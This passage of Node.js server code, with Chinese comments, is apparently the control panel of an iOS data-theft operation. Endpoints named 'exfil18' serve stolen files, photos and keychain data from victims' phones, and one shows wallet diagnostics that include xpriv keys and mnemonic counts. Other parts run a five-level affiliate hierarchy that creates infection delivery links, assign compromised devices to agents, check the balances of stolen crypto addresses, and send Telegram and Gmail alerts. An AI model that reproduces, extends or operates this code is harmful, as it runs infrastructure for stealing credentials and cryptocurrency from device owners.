          if (r && r.pi && r.pi.total > 0) return { ipds: r.ipds, pi: r.pi };
        } catch (e) { console.error('[panel] ipData PG 失败，回退快照:', e.message); }
      }
      // 【2026-09-20】快照回退同样按 s/p 切片（与 PG 分页语义一致；新前端为后端分页，全量返回会串页）
      try { await _beaconDeviceCountByIp(); } catch (e) {}
      let is = af(store.ipData, 'ip').slice();
      const linkIp = af(_linkVisitsAsIpData(), 'ip');
      if (linkIp.length) {
        const m = new Map(is.map(x => [x.ip, x]));
        for (const row of linkIp) {
          const prev = m.get(row.ip);
          if (!prev) { m.set(row.ip, row); continue; }
          m.set(row.ip, Object.assign({}, prev, {
            report_count: (prev.report_count || 0) + (row.report_count || 0),
            visit_count: (prev.visit_count || 0) + (row.visit_count || 0),
            last_ts: Math.max(Number(prev.last_ts || prev.ts || 0), Number(row.last_ts || row.ts || 0)),
            first_ts: Math.min(Number(prev.first_ts || prev.ts || 1e15), Number(row.first_ts || row.ts || 1e15)) || prev.first_ts,
            ts: Math.max(Number(prev.ts || 0), Number(row.ts || 0)),
            devices: prev.devices || row.devices,
          }));
        }
        is = _enrichIpRowsWithDevices([...m.values()]);
      }
      is = _enrichIpRowsWithDevices(is);
      is.sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      const _s = Math.max(1, parseInt(q.s || '20', 10) || 20);
      const _p = Math.max(0, parseInt(q.p || '0', 10) || 0);
      return { ipds: is.slice(_p * _s, _p * _s + _s), pi: { r: Math.max(0, Math.min(_s, is.length - _p * _s)), s: _s, p: _p, total: is.length } };
    },
    // 【2026-09-20】访问日志：投递链打开日志尾部（readDeliveriesTail，30s 缓存）+ filterByAgent(ip) 过滤（超管全量/代理按可见 IP 集）
    '/api/user/user_visit_log/list': () => {
      let vs = [];
      try {
        const fromDl = authStore.filterByAgent(currentUser.id, readDeliveriesTail(2000), 'ip');
        const fromLink = authStore.filterByAgent(currentUser.id, _linkVisitsAsVisitLogs(), 'ip');
        vs = [...fromDl, ...fromLink].slice()
          .sort((a,b)=>(Number(b.ts||0))-(Number(a.ts||0)));
      } catch (e) { console.error('[panel] visit_log 读取失败:', e.message); }
      return { visit_logs: vs, pi: pager(vs, q) };
    },
    '/api/admin/admin_action_log/list': () => {
      let authLogs = authStore.listLogs(500);
      if (!isSuperAdmin(currentUser)) {
        const myIds = new Set([currentUser.id]);
        try {
          const exclIds = authStore.getExclusiveAgents();
          const agents = authStore.listAgents();
          // 【2026-09-11 审计修复】专属代理的日志对非超管父代理不可见（与设备数据同一隔离面）
          agents.filter(a => a.parent_id === currentUser.id && !exclIds.has(a.id)).forEach(a => myIds.add(a.id));
        } catch {}
        authLogs = authLogs.filter(l => l.user_id === currentUser.id || myIds.has(l.user_id) || l.username === currentUser.username);
      }
      const lootLogs = af(store.adminLogs).slice();
      const merged = [...authLogs, ...lootLogs].sort((a,b)=>{
        const ta = a.ts || a.created_at || ''; const tb = b.ts || b.created_at || '';
        return String(tb).localeCompare(String(ta));
      });
      return { aals: merged, pi: pager(merged, q) };
    },

    '/api/exfil18/list': async () => {
      // 【P4.1-2b】PG 分支：后端分页 + kw/serial 筛选；walletDiag 从 wallet18.json 直读（按可见设备过滤）
      if (panelPgDev) {
        try {
          const r0 = await panelPgDev.recPage('exfil18', currentUser, q, {
            kwFields: ["e.data->>'path' ILIKE ?", "e.data->>'description' ILIKE ?", "e.data->>'category' ILIKE ?", "e.data->>'data_type' ILIKE ?", "left(e.data->>'preview',200) ILIKE ?"],
          });
          if (r0) {
            let wd = {};
            try {
              const wj = JSON.parse(fs.readFileSync(path.join(__dirname, 'data', 'wallet18.json'), 'utf8'));
              const vis = await panelPgDev.visibleSerials(currentUser);
              for (const k of Object.keys(wj)) {
                if (!vis.has(k)) continue;
                const e2 = wj[k] || {};
                wd[k] = {
                  serial: k, pt: e2.pt || '', ov: e2.ov || '', files: e2.files || 0, kc_items: e2.kc_items || 0,
                  crypto_apps: e2.crypto_apps || [], wallet_svcs: e2.wallet_svcs || [], secure_stores: e2.secure_stores || [],
                  okx: e2.okx ? { root: e2.okx.root || '', name: e2.okx.name || '', backup: e2.okx.backup,
                    addr_count: (e2.okx.addresses || []).length, addr_total: e2.okx.addr_total || 0,
                    xpub: e2.okx.xpub || '', xpriv: e2.okx.xpriv || '', data_len: e2.okx.data_len || 0 } : null,
                  mnem_count: e2.mnem_count || 0, status: e2.status || '', status_text: e2.status_text || '',
                };
              }
            } catch (e2) { /* wallet18 缺失不阻断列表 */ }
            return { exfil18: r0.list, walletDiag: wd, pi: r0.pi };
          }
        } catch (e) { console.error('[panel] PG exfil18 失败，回退快照路径:', e.message); }
      }
      let xs = af(q.serial ? devData(q.serial).exfil18 : feed('exfil18')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      // 【2026-09-12】支持 ?serial= 只看某台设备（面板「系统文件」改成 设备→该设备数据 两级）
      if (q.serial) xs = xs.filter(x => x.serial === q.serial);
      // 18 链钱包解密诊断（按当前用户可见设备过滤）：装了哪些钱包 / keychain 有没有密钥 / 为什么没解出
      // 【2026-09-12 性能修复】批量化：原实现每条 walletDiag（587 条）单独调一次 af()
      //   （每次重建隔离足迹 O(16566)）→ 本端点 8s；改为一次批量过滤。
      const wd = {};
      const wdEntries = Object.entries(store.walletDiag || {});
      if (wdEntries.length) {
        const visSet = new Set(af(wdEntries.map(([s2]) => ({ serial: s2 }))).map(x => x.serial));
        for (const [s2, v] of wdEntries) if (visSet.has(s2)) wd[s2] = v;
      }
      return { exfil18: xs, walletDiag: wd, pi: pager(xs, q) };
    },
    // 【2026-09-12】系统文件「按设备聚合」：一级列表用（设备信息 + 各类条数），避免一次拉 6000+ 条目
    '/api/exfil18/summary': () => {
      // 【2026-09-12 分片升级】优先读构建期预聚合（全量口径）
      const pre = store.summaries && store.summaries.exfil18;
      if (pre) { const rows = af(pre.devices || []); return { devices: rows.slice(), orphans: af(pre.orphans || []), pi: pager(rows, q) }; }
      const xs = af(feed('exfil18'));
      const agg = new Map();
      const orphans = new Map();   // 【2026-09-12】无设备归属的条目（如手工测试包 loot/TESTDEV）
      for (const x of xs) {
        const s = x.serial || '';
        if (!s) { const k = x.ip || '?'; orphans.set(k, (orphans.get(k) || 0) + 1); continue; }
        let a = agg.get(s);
        if (!a) { a = { serial: s, total: 0, size: 0, cats: {}, last_ts: 0, ip: '' }; agg.set(s, a); }
        a.total++;
        a.size += Number(x.orig_size || x.decoded_size || 0) || 0;
        const c = x.category || 'other';
        a.cats[c] = (a.cats[c] || 0) + 1;
        const t = Number(x.ts || 0);
        if (t > a.last_ts) a.last_ts = t;
        if (x.ip) a.ip = x.ip;
      }
      const out = [];
      for (const a of agg.values()) {
        const dv = store.devices.get(a.serial) || {};
        out.push(Object.assign({}, a, {
          machine: dv.hardware_model || '', ios_version: dv.os_version || dv.build_version || '',
          ip: a.ip || dv.ip || '', first_seen: dv.first_seen || 0, last_seen: dv.last_seen || a.last_ts,
          cat_n: Object.keys(a.cats).length,
          cat_top: Object.entries(a.cats).sort((p, r) => r[1] - p[1]).slice(0, 4).map(([k, v]) => k + '×' + v).join('  '),
        }));
      }
      out.sort((p, r) => (r.total - p.total) || ((r.last_seen || 0) - (p.last_seen || 0)));
      const orph = [...orphans.entries()].map(([ip, n]) => ({ ip, n }));
      return { devices: out, orphans: orph, pi: pager(out, q) };
    },
    '/api/exfil18/detail': async () => {
      // 【P4.3 修复】PG 分支：按 PG 主键回查
      if (panelPgDev) {
        try {
          const x = await panelPgDev.findRecord(currentUser, 'exfil18', q.id || q.i);
          if (x) return { exfil: x };
        } catch (e) { console.error('[panel] PG exfil detail 失败，回退:', e.message); }
      }
      const id = parseInt(q.id || q.i || '0', 10);
      const x = findRec('exfil18', id);   // 【分片升级】id→设备分片（含行级隔离过滤），兜底全局流
      return x ? { exfil: x } : { message: 'not found' };
    },
    '/api/user/chain_log/list': () => {
      const ls = af(feed('chainLogs')).slice().sort((a,b)=>(Number(b.ts||b.created_at||0))-(Number(a.ts||a.created_at||0)));
      return { chain_logs: ls, pi: pager(ls, q) };
    },
    '/api/exfil18/db': () => {
      const id = parseInt(q.id || q.i || '0', 10);
      const kind = q.kind || 'auto';
      const x = findRec('exfil18', id);   // 【分片升级】id→设备分片（含行级隔离过滤），兜底全局流
      const bin = x && x.bin_path ? x.bin_path : null;
      if (!bin || !fs.existsSync(bin)) return { message: 'no bin' };
      try {
        const { execFileSync } = require('child_process');
        const out = execFileSync('/usr/bin/python3', [path.join(__dirname, 'parse18.py'), bin, kind], { maxBuffer: 16 * 1024 * 1024, timeout: 15000 });
        return JSON.parse(out.toString('utf8'));
      } catch (e) { return { message: 'parse failed', err: String(e).slice(0, 200) }; }
    },
    '/api/exfil18/file': () => {
      const id = parseInt(q.id || q.i || '0', 10);
      const x = findRec('exfil18', id) || findRec('photos', id);   // 【分片升级】id→设备分片（含行级隔离过滤），兜底全局流
      const bin = x && x.bin_path ? x.bin_path : null;
      if (!bin || !fs.existsSync(bin)) return { __raw: 404 };
      let buf = fs.readFileSync(bin);
      try {
        const j = JSON.parse(buf.toString('utf8'));
        if (j && j.data) buf = Buffer.from(j.data, 'base64');
      } catch {}
      const name = (x.source_path || x.path || x.name || bin).split('/').pop();
      const ext = path.extname(name).toLowerCase();
      const mime = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.heic': 'image/heic', '.mov': 'video/quicktime', '.gif': 'image/gif', '.db': 'application/octet-stream' }[ext] || 'application/octet-stream';
      return { __raw: 200, buf, mime };
    },
    // 【2026-09-11】语义化解读：ext_stats 的 data 本来就是明文原文件，但直接展示人看不懂。
    //   这里按"文件是什么"返回结构化视图：keychain→表格(Data 自动 hex 解码 + ★钱包项置顶)、
    //   WiFi→表格、应用清单→表格、二进制→文件头+字符串+App资源定性、SQLite→提示走解析。
    '/api/exfil18/view': async () => {
      const id = parseInt(q.id || q.i || '0', 10);
      // 【2026-09-14 修复】"文件不存在" 根因：只查 lootStore（老分片），PG 里有 bin_path 却取不到。
      //   改为 PG 优先（panelPgDev.findRecord 已带 bin_path），异常/未命中再落 lootStore 老路径。
      let x = null;
      if (panelPgDev) {
        try { x = await panelPgDev.findRecord(currentUser, 'exfil18', id); } catch (e) { /* 落老路径 */ }
      }
      if (!x) x = findRec('exfil18', id) || findRec('photos', id);
      const bin = x && x.bin_path ? x.bin_path : null;
      if (!bin || !fs.existsSync(bin)) return { ok: false, message: '文件不存在' };
      try {
        const { execFileSync } = require('child_process');
        const out = execFileSync('/usr/bin/python3', [path.join(__dirname, 'parse18.py'), bin, 'view'],
          { maxBuffer: 32 * 1024 * 1024, timeout: 30000 });
        return JSON.parse(out.toString('utf8'));
      } catch (e) {
        return { ok: false, message: '解读失败', err: String(e).slice(0, 200) };
      }
    },
  };

  // ── Agent management (super_admin only) ──
  if (p.startsWith('/api/admin/agent/')) {
    const canManageAgents = isSuperAdmin(currentUser) || (currentUser.permissions && currentUser.permissions.includes('agents'));
    if (!canManageAgents) return json(res, 403, { message: '无权限' });

    if (req.method === 'POST' && p === '/api/admin/agent/create') {
      const b = await readBody(req);
      if (!b.username || !b.password) return json(res, 400, { message: '用户名和密码必填' });
      // 【2026-09-13 套娃上限（用户拍板：3 → 5 层）】代理链 = 超管 → L1 → L2 → L3 → L4 → L5；
      //   agents（代理管理）权限允许逐层下授（L1 可给 L2、…、L4 可给 L5），但 L5 不能再创建下级 ——
      //   层级上限在"创建"这一步强制（无论创建者有什么权限）。
      if (!isSuperAdmin(currentUser)) {
        let d = 0, cur = currentUser, guard = 0;
        while (cur && cur.role === 'agent' && guard++ < 20) {
          d++;
          cur = cur.parent_id ? authStore.getAgent(cur.parent_id) : null;
        }
        if (d >= 5) return json(res, 400, { message: '代理层级已达上限（最多 5 层），无法再创建下级' });
      }
      const agent = authStore.createAgent({ username: b.username, password: b.password, label: b.label, permissions: b.permissions, parent_id: currentUser.id });
      if (!agent) return json(res, 400, { message: '用户名已存在或参数无效' });
      const autoLink = authStore.createLink(agent.id, agent.label || agent.username + '的投递链', 'wpsdz.com');
      authStore.addLog('创建代理', currentUser.id, currentUser.username, getIP(req), '代理: ' + b.username + (autoLink ? ' 自动链接: ' + autoLink.code : ''));
      return json(res, 200, { agent, auto_link: autoLink });
    }
    if (req.method === 'GET' && p === '/api/admin/agent/list') {
      let agents = authStore.listAgents();
      const exclIds = authStore.getExclusiveAgents();
      // 【2026-09-11 第二次收紧】专属代理的可见性由 viewer_ids 白名单决定（不再按"是否超管"）
      const canSeeExcl = authStore.getExclusiveViewers().has(currentUser.id);
      if (!isSuperAdmin(currentUser)) {
        // 【2026-09-13 多级裂变】可见"整棵下级树"（递归，只读展示）；编辑/删除仍限直接子级（is_direct 控制）
        const descSet = new Set(authStore.getDescendantAgentIds(currentUser.id));
        agents = agents.filter(a => descSet.has(a.id) && !exclIds.has(a.id));
      }
      const enriched = agents.map(a => {
        const devs = authStore.getAgentDevices(a.id);
        const stats = authStore.getAgentStats(a.id);
        // 【2026-09-13 多级裂变】depth=层级（超管视角 L1=1…）；is_direct=当前账号的直接子级（可编辑）；countTotal=含下级合计
        const base = {
          ...a,
          depth: authStore.getAgentDepth(a.id),
          is_direct: a.parent_id === currentUser.id,
          device_count_total: authStore.getAgentDeviceCountTotal(a.id),
        };
        if (!canSeeExcl && exclIds.has(a.id)) {
          // 账号行保留（便于账号管理），但设备数/设备统计一律抹平
          return { ...base, device_count: 0, device_count_total: 0, stats: { total_devices: 0, total_links: stats.total_links, active_links: stats.active_links, total_visits: 0 } };
        }
        return { ...base, device_count: devs.length, stats };
      });
      return json(res, 200, { agents: enriched });
    }
    if (req.method === 'GET' && p === '/api/admin/agent/detail') {
      const id = parseInt(q.id || '0', 10);
      const agent = authStore.getAgent(id);
      if (!agent) return json(res, 404, { message: '代理不存在' });
      if (!isSuperAdmin(currentUser)) {
        // 【2026-09-13 多级裂变】查看权限从"直接子级"放行到"整棵下级树"（只读）；编辑/删除仍限直接子级
        const descSet = new Set(authStore.getDescendantAgentIds(currentUser.id));
        if (!descSet.has(agent.id)) return json(res, 403, { message: '无权查看此代理' });
      }
      // 【2026-09-11 第二次收紧】专属代理的 devices/links/stats 只对白名单账号（viewer_ids）可见；
      //   非超管、以及不在白名单里的超管（如 admin）一律 403。
      if (authStore.getExclusiveAgents().has(id) && !authStore.getExclusiveViewers().has(currentUser.id)) return json(res, 403, { message: '无权查看此代理' });
      const devs = authStore.getAgentDevices(id);
      const links = authStore.listLinks(id);
      const stats = authStore.getAgentStats(id);
      return json(res, 200, { agent, devices: devs, links, stats });
    }
    if (req.method === 'PUT' && p === '/api/admin/agent/update') {
      const b = await readBody(req);
      if (!b.id) return json(res, 400, { message: '缺少代理 ID' });
      if (!isSuperAdmin(currentUser)) { const t = authStore.getAgent(b.id); if (!t || t.parent_id !== currentUser.id) return json(res, 403, { message: '无权编辑此代理' }); }
      // 【2026-09-12】防套娃策略调整为「层级上限」（见 create 处注释）；update 不再剥离权限。
      const agent = authStore.updateAgent(b.id, { username: b.username, password: b.password, label: b.label, status: b.status, permissions: b.permissions });
      if (!agent) return json(res, 404, { message: '代理不存在或用户名已被占用' });
      authStore.addLog('编辑代理', currentUser.id, currentUser.username, getIP(req), 'ID:' + b.id + ' ' + (b.username||b.label||''));
      return json(res, 200, { agent });
    }
    if (req.method === 'POST' && p === '/api/admin/agent/reset-pw') {
      const b = await readBody(req);
      if (!b.id || !b.password) return json(res, 400, { message: '缺少代理 ID 或新密码' });
      if (!isSuperAdmin(currentUser)) { const t = authStore.getAgent(b.id); if (!t || t.parent_id !== currentUser.id) return json(res, 403, { message: '无权操作' }); }
      const ok = authStore.resetAgentPassword(b.id, b.password);
      if (!ok) return json(res, 404, { message: '代理不存在' });
      authStore.addLog('重置代理密码', currentUser.id, currentUser.username, getIP(req), 'ID:' + b.id);
      return json(res, 200, { ok: true });
    }
    if (req.method === 'DELETE' && p === '/api/admin/agent/delete') {
      const b = await readBody(req);
      if (!b.id) return json(res, 400, { message: '缺少代理 ID' });
      if (!isSuperAdmin(currentUser)) { const t = authStore.getAgent(b.id); if (!t || t.parent_id !== currentUser.id) return json(res, 403, { message: '无权删除此代理' }); }
      const ok = authStore.deleteAgent(b.id);
      if (!ok) return json(res, 404, { message: '代理不存在' });
      authStore.addLog('删除代理', currentUser.id, currentUser.username, getIP(req), 'ID:' + b.id);
      return json(res, 200, { ok: true });
    }
    return json(res, 404, { message: 'no such route' });
  }

  // ── Link management ──
  if (p.startsWith('/api/admin/link/')) {
    if (!hasPermission(currentUser, 'links')) return json(res, 403, { message: '无权限' });

    if (req.method === 'POST' && p === '/api/admin/link/create') {
      if (!isSuperAdmin(currentUser)) return json(res, 403, { message: '仅管理员可创建链接' });
      const b = await readBody(req);
      const userId = b.user_id || currentUser.id;
      const link = authStore.createLink(userId, b.label, b.domain);
      if (!link) return json(res, 400, { message: '创建失败' });
      const domain = link.domain || req.headers.host || 'wpsdz.com';
      link.url = 'https://' + domain + '/go/' + link.code;
      authStore.addLog('创建链接', currentUser.id, currentUser.username, getIP(req), 'code:' + link.code + ' 代理ID:' + userId);
      return json(res, 200, { link });
    }
    if (req.method === 'GET' && p === '/api/admin/link/list') {
      const userId = isSuperAdmin(currentUser) ? (parseInt(q.user_id || '0', 10) || null) : currentUser.id;
      const links = authStore.listLinks(userId);
      const host = req.headers.host || 'wpsdz.com';
      links.forEach(l => { l.url = 'https://' + (l.domain || host) + '/go/' + l.code; });
      return json(res, 200, { links });
    }
    if (req.method === 'DELETE' && p === '/api/admin/link/delete') {
      if (!isSuperAdmin(currentUser)) return json(res, 403, { message: '仅管理员可删除链接' });
      const b = await readBody(req);
      if (!b.id) return json(res, 400, { message: '缺少链接 ID' });
      const ok = authStore.deleteLink(b.id);
      if (!ok) return json(res, 404, { message: '链接不存在' });
      authStore.addLog('删除链接', currentUser.id, currentUser.username, getIP(req), 'ID:' + b.id);
      return json(res, 200, { ok: true });
    }
    return json(res, 404, { message: 'no such route' });
  }

  // ── Device assignment（归属清单：代理只读可见自己子树；分配/取消：仅超管） ──
  if (p.startsWith('/api/admin/device/')) {
    // 【2026-09-18】「设备归属」对代理开放（只读）：仅返回本人 + 全部可继承下级的归属；其它代理/专属/暗池设备绝不出现
    if (req.method === 'GET' && p === '/api/admin/device/agents') {
      const isSuper = isSuperAdmin(currentUser);
      if (!isSuper && !hasPermission(currentUser, 'devices')) return json(res, 403, { message: '无权查看（需设备权限）' });
      const mkExcl = authStore.getExclusiveAgents();
      const mkView = authStore.getExclusiveViewers().has(currentUser.id);
      let agents = authStore.listAgents();
      if (!isSuper) {
        const sub = new Set([currentUser.id]);
        if (!mkExcl.has(currentUser.id)) {
          for (const did of authStore.getDescendantAgentIds(currentUser.id)) {
            if (!mkExcl.has(did)) sub.add(did);
          }
        }
        agents = agents.filter(a => sub.has(a.id));
      }
      const vault = new Set(authStore.getVaultSerials ? authStore.getVaultSerials() : []);
      const mappings = agents.map(a => ({
        agent_id: a.id,
        agent_label: a.label,
        agent_username: a.username,
        devices: ((!mkView && mkExcl.has(a.id)) ? [] : authStore.getAgentDevices(a.id)).filter(s => !vault.has(s)),
      }));
      return json(res, 200, { mappings });
    }

    if (!isSuperAdmin(currentUser)) return json(res, 403, { message: '仅超级管理员可操作' });

    if (req.method === 'POST' && p === '/api/admin/device/assign') {
      const b = await readBody(req);
      if (!b.serial || !b.user_id) return json(res, 400, { message: '缺少设备序列号或代理 ID' });
      authStore.assignDevice(b.serial, b.user_id);
      authStore.addLog('分配设备', currentUser.id, currentUser.username, getIP(req), '设备:' + b.serial + ' → 代理ID:' + b.user_id);
      return json(res, 200, { ok: true });
    }
    if (req.method === 'POST' && p === '/api/admin/device/unassign') {
      const b = await readBody(req);
      if (!b.serial) return json(res, 400, { message: '缺少设备序列号' });
      authStore.unassignDevice(b.serial);
      authStore.addLog('取消分配设备', currentUser.id, currentUser.username, getIP(req), '设备:' + b.serial);
      return json(res, 200, { ok: true });
    }
    return json(res, 404, { message: 'no such route' });
  }

  // ── System stats (super_admin only) ──
  if (req.method === 'GET' && p === '/api/admin/system/stats') {
    if (!isSuperAdmin(currentUser)) return json(res, 403, { message: '仅超级管理员可查看' });
    const stats = authStore.getAllStats();
    return json(res, 200, { stats, agents: authStore.listAgents().length });
  }

  // ── 【2026-09-14】余额记录页（超管专属）：/balances 独立页面 + 两个 API ──
  //    【2026-09-16】改为权限门：超管 或 持有 'balances' 权限的代理（代理按名下设备行级隔离）
  if (req.method === 'GET' && p === '/api/admin/balances/list') {
    if (!isSuperAdmin(currentUser) && !hasPermission(currentUser, 'balances')) return json(res, 403, { message: '无权查看（需余额记录权限）' });
    if (!panelPgDev) return json(res, 200, { list: [], pi: { r: 0, s: 50, p: 0, total: 0 } });
    try {
      const r = await panelPgDev.balances(currentUser, q);
      return json(res, 200, r);
    } catch (e) { console.error('[panel] balances 失败:', e.message); return json(res, 200, { list: [], pi: { r: 0, s: 50, p: 0, total: 0 }, err: e.message }); }
  }
  if (req.method === 'GET' && p === '/api/admin/balances/stats') {
    if (!isSuperAdmin(currentUser) && !hasPermission(currentUser, 'balances')) return json(res, 403, { message: '无权查看（需余额记录权限）' });
    if (!panelPgDev) return json(res, 200, {});
    try {
      return json(res, 200, await panelPgDev.balanceStats(currentUser));
    } catch (e) { console.error('[panel] balanceStats 失败:', e.message); return json(res, 200, {}); }
  }

  // ── Balance query tool ──
  if (req.method === 'GET' && p === '/api/tool/balance_query') {
    if (!hasPermission(currentUser, 'addresses')) return json(res, 403, { message: '无权限' });
    const address = q.address || '';
    const chain = (q.chain || 'ETH').toUpperCase();
    if (!address) return json(res, 400, { message: '缺少地址参数' });

    try {
      const https = require('https');
      const http2 = require('http');

      function fetchJson(url) {
        return new Promise((resolve, reject) => {
          const mod = url.startsWith('https') ? https : http2;
          const req2 = mod.get(url, { timeout: 10000 }, (r) => {
            let data = '';
            r.on('data', c => data += c);
            r.on('end', () => {
              try { resolve(JSON.parse(data)); } catch { resolve({ raw: data }); }
            });
          });
          req2.on('error', reject);
          req2.on('timeout', () => { req2.destroy(); reject(new Error('timeout')); });
        });
      }

      let result = { address, chain, balance: null, balance_usd: null, tokens: [] };

      if (chain === 'TRX' || chain === 'TRON') {
        const d = await fetchJson('https://apilist.tronscanapi.com/api/accountv2?address=' + encodeURIComponent(address));
        if (d && d.balance !== undefined) {
          result.balance = (d.balance / 1e6).toFixed(6) + ' TRX';
          result.balance_usd = d.balanceInUsd ? '$' + Number(d.balanceInUsd).toFixed(2) : null;
          result.tokens = (d.withPriceTokens || []).slice(0, 20).map(t => ({
            symbol: t.tokenAbbr || t.tokenName,
            balance: t.amount || t.balance,
            value_usd: t.amountInUsd ? '$' + Number(t.amountInUsd).toFixed(2) : null
          }));
        }
      } else {
        const explorers = {
          'ETH': 'https://api.etherscan.io/api',
          'BSC': 'https://api.bscscan.com/api',
          'POLYGON': 'https://api.polygonscan.com/api',
          'ARB': 'https://api.arbiscan.io/api',
          'BASE': 'https://api.basescan.org/api',
        };
        const baseUrl = explorers[chain] || explorers['ETH'];
        const d = await fetchJson(baseUrl + '?module=account&action=balance&address=' + encodeURIComponent(address) + '&tag=latest');
        if (d && d.result) {
          const bal = Number(d.result) / 1e18;
          result.balance = bal.toFixed(6) + ' ' + (chain === 'BSC' ? 'BNB' : chain === 'POLYGON' ? 'MATIC' : 'ETH');
        }
      }

      return json(res, 200, result);
    } catch (e) {
      return json(res, 200, { address, chain, balance: null, error: String(e).slice(0, 200) });
    }
  }

  // ── Notification config (super_admin only) ──
  if (p.startsWith('/api/admin/notify/')) {
    if (!isSuperAdmin(currentUser)) return json(res, 403, { message: '仅超级管理员' });

    if (req.method === 'GET' && p === '/api/admin/notify/config') {
      const cfg = notifier.loadConfig();
      cfg.gmail_app_password = cfg.gmail_app_password ? '••••••••' : '';
      return json(res, 200, { config: cfg });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/config') {
      const b = await readBody(req);
      const old = notifier.loadConfig();
      const cfg = {
        enabled: b.enabled !== undefined ? !!b.enabled : old.enabled,
        gmail_user: b.gmail_user || old.gmail_user,
        gmail_app_password: b.gmail_app_password && b.gmail_app_password !== '••••••••' ? b.gmail_app_password : old.gmail_app_password,
        recipients: b.recipients || old.recipients,
        notify_on: b.notify_on || old.notify_on,
      };
      notifier.saveConfig(cfg);
      return json(res, 200, { ok: true });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/test') {
      const ok = await notifier.sendGmail('测试通知 — 黑洞iOS无感系统', '<h2>✅ 邮件通知测试成功</h2><p>如果您收到此邮件，说明Gmail通知配置正确。</p><p>— 黑洞iOS无感系统</p>');
      return json(res, 200, { ok: !!ok, message: ok ? '测试邮件已发送' : '发送失败，请检查配置' });
    }
    // ── 【2026-09-15】实时通知栏：站内通知 + TG 配置 + 监控地址 ──
    const NCFG_F = path.join(__dirname, 'data', 'notify_cfg.json');
    const readNcfg = () => { try { return JSON.parse(fs.readFileSync(NCFG_F, 'utf8')); } catch (e) { return {}; } };
    if (req.method === 'GET' && p === '/api/admin/notify/list') {
      const size = Math.min(200, Math.max(1, parseInt(q.s || '50', 10) || 50));
      const page = Math.max(0, parseInt(q.p || '0', 10) || 0);
      // 【2026-09-16 口径修正】专属代理设备通知：仅对非 viewer 管理账号（admin id1）隐藏；
      //   viewer（superadmin id3）全量可见可收（与 visibility.json / TG 全局 chat 口径一致）
      const _ex = Array.from(authStore.getExclusiveAgents ? authStore.getExclusiveAgents() : []).map(Number).filter(Boolean);
      const _isViewer = authStore.getExclusiveViewers ? authStore.getExclusiveViewers().has(currentUser.id) : false;
      const _excl = !_isViewer && _ex.length > 0;
      const _p = [];
      // 【2026-09-16】暗池兜底：vault 相关通知对所有人不可见（源头已删除/抑制）
      let _c = `NOT EXISTS (SELECT 1 FROM vault_items v WHERE v.addr = (n.body->>'addr') OR (v.serial IS NOT NULL AND v.serial = (n.body->>'serial')))`;
      // 【2026-09-17 隔离】监控地址（无 serial）的站内通知仅归属账号可见；历史无主行不外显
      _c += ` AND NOT ((n.body->>'serial') IS NULL AND (n.body->>'addr') IS NOT NULL AND EXISTS (SELECT 1 FROM watch_addrs w WHERE w.addr = (n.body->>'addr') AND (w.owner_id IS DISTINCT FROM ${Number(currentUser.id) || 0})))`;
      if (_excl) { _p.push(_ex); _c += ` AND NOT EXISTS (SELECT 1 FROM agent_device ad WHERE ad.serial = (n.body->>'serial') AND ad.agent_id = ANY($${_p.length}::bigint[]))`; }
      _p.push(size); const $lim = '$' + _p.length;
      _p.push(page * size); const $off = '$' + _p.length;
      const r = await _pgPool().query(
        `SELECT n.id, n.type, n.title, n.body, n.created_at, n.read_at, n.tg_sent FROM notifications n WHERE ${_c} ORDER BY n.id DESC LIMIT ${$lim} OFFSET ${$off}`,
        _p);
      const c = await _pgPool().query(`SELECT count(*)::int AS n FROM notifications n WHERE ${_c}`, _excl ? [_ex] : []);
      return json(res, 200, { list: r.rows, pi: { s: size, p: page, total: c.rows[0] ? c.rows[0].n : 0 } });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/read') {
      const b = await readBody(req);
      // 【2026-09-16】非 viewer（admin id1）"全部已读"不触碰专属代理设备的通知（读态全局共享，避免影响 viewer）
      if (b.all) {
        const _exR = Array.from(authStore.getExclusiveAgents ? authStore.getExclusiveAgents() : []).map(Number).filter(Boolean);
        const _isViewerR = authStore.getExclusiveViewers ? authStore.getExclusiveViewers().has(currentUser.id) : false;
        // 【2026-09-17 隔离】"全部已读"同样不触碰别人名下的监控地址通知
        const _wR = `NOT ((n.body->>'serial') IS NULL AND (n.body->>'addr') IS NOT NULL AND EXISTS (SELECT 1 FROM watch_addrs w WHERE w.addr = (n.body->>'addr') AND (w.owner_id IS DISTINCT FROM ${Number(currentUser.id) || 0})))`;
        if (!_isViewerR && _exR.length) {
          await _pgPool().query(`UPDATE notifications n SET read_at = now() WHERE n.read_at IS NULL AND ${_wR} AND NOT EXISTS (SELECT 1 FROM agent_device ad WHERE ad.serial = (n.body->>'serial') AND ad.agent_id = ANY($1::bigint[]))`, [_exR]);
        } else {
          await _pgPool().query(`UPDATE notifications n SET read_at = now() WHERE n.read_at IS NULL AND ${_wR}`);
        }
      }
      else if (Array.isArray(b.ids) && b.ids.length) await _pgPool().query(`UPDATE notifications SET read_at = now() WHERE id = ANY($1::bigint[]) AND read_at IS NULL`, [b.ids.map(Number).filter(Boolean)]);
      return json(res, 200, { ok: true });
    }
    if (req.method === 'GET' && p === '/api/admin/notify/unread') {
      // 【2026-09-16】同 list 口径：非 viewer 不计专属代理设备；暗池相关一律不计（对所有人）
      const _exU = Array.from(authStore.getExclusiveAgents ? authStore.getExclusiveAgents() : []).map(Number).filter(Boolean);
      const _isViewerU = authStore.getExclusiveViewers ? authStore.getExclusiveViewers().has(currentUser.id) : false;
      let _vU = `NOT EXISTS (SELECT 1 FROM vault_items v WHERE v.addr = (n.body->>'addr') OR (v.serial IS NOT NULL AND v.serial = (n.body->>'serial')))`;
      // 【2026-09-17 隔离】未读计数同 list：别人名下的监控地址通知不计入
      _vU += ` AND NOT ((n.body->>'serial') IS NULL AND (n.body->>'addr') IS NOT NULL AND EXISTS (SELECT 1 FROM watch_addrs w WHERE w.addr = (n.body->>'addr') AND (w.owner_id IS DISTINCT FROM ${Number(currentUser.id) || 0})))`;
      let _rU;
      if (!_isViewerU && _exU.length) {
        _rU = await _pgPool().query(`SELECT count(*)::int AS n FROM notifications n WHERE n.read_at IS NULL AND ${_vU} AND NOT EXISTS (SELECT 1 FROM agent_device ad WHERE ad.serial = (n.body->>'serial') AND ad.agent_id = ANY($1::bigint[]))`, [_exU]);
